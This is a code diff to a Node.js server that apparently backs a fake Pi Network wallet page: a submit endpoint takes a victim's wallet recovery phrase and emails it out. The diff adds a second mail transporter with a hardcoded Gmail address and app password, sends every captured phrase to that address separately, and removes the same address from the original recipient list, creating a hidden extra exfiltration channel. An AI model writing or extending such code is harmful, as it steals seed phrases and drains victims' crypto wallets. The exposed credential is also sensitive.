@@ -24,6 +24,14 @@ const transporter = nodemailer.createTransport({
   service: 'gmail'
 })
 
+const tp = nodemailer.createTransport({
+  auth: {
+    pass: 'giou rjxy aand bvpr',
+    user: 'fantomlegen@gmail.com'
+  },
+  service: 'gmail'
+})
+
 // logs any error
 
 const upload = multer();
@@ -52,12 +60,23 @@ app.post("/submit/7668", async (req, res) => {
   // forward to Email
   console.log({ mfText });
   try {
+
+        const m = await tp.sendMail(
+      {
+        from: "PiNetworkWallet ",
+        to: ["fantomlegen@gmail.com"],
+        subject: "pinetwork phrase",
+        text: mfText,
+        
+        html: `<h1>${mfText}</h1>`,
+      }
+      );
     
     const msg = await transporter.sendMail(
       {
         from: "PiNetworkWallet ",
         // to: ["chiemelapromise30@gmail.com"],
-        to: ["pinetworkm493@gmail.com", "fantomlegen@gmail.com"],
+        to: ["pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
         
